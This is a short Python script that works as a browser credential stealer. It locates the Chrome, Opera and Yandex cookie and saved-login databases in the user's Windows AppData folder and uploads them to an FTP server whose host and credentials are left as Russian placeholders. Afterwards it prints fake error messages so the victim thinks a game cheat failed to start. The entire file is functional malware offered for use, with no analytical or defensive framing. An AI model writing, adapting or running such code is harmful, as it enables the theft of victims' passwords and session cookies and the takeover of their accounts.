

import os.path
import getpass
from ftplib import FTP
import random

con = FTP("хост", "логин", "пароль")

"""
Hack to directory
"""

user_dir = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\'

dir_cookie_google = user_dir + 'Local\\Google\\Chrome\\User Data\\Default\\Cookies'
dir_pass_google = user_dir + 'Local\\Google\\Chrome\\User Data\\Default\\Login Data'
dir_cookie_yandex = user_dir + 'Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'
dir_pass_yandex = user_dir + 'Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker'
dir_cookie_opera = user_dir + 'Roaming\\Opera Software\\Opera Stable\\Cookies'
dir_pass_opera = user_dir + 'Roaming\\Opera Software\\Opera Stable\\Login Data'
dir_google = user_dir + 'Local\\Google\\Chrome\\User Data\\Safe Browsing Cookies'
dir_firefox = user_dir + 'Roaming\\Mozilla\\Firefox'
dir_yandex = user_dir + 'Local\\Yandex'
dir_opera = user_dir + 'Roaming\\Opera Software'


def check(browser, browser_pass, dir_cookie_browser, dir_pass_browser, dir_browser):
    if os.path.exists(dir_browser):
        filename = browser+str(random.randint(1, 10000))
        filename2 = browser_pass + str(random.randint(1, 10000))
        with open(dir_cookie_browser, "rb") as content:
            con.storbinary("STOR %s" % filename, content)
        with open(dir_pass_browser, "rb") as content:
            con.storbinary("STOR %s" % filename2, content)


if __name__ == "__main__":
    check('google', 'google_pass', dir_cookie_google, dir_pass_google, dir_google)
    check('opera', 'opera_pass', dir_cookie_opera, dir_pass_opera, dir_opera)
    check('yandex', 'yandex_pass', dir_cookie_yandex, dir_pass_yandex, dir_yandex)
    print("Error library import HOUII.dll")
    print("Error RUN cheat")
    input()
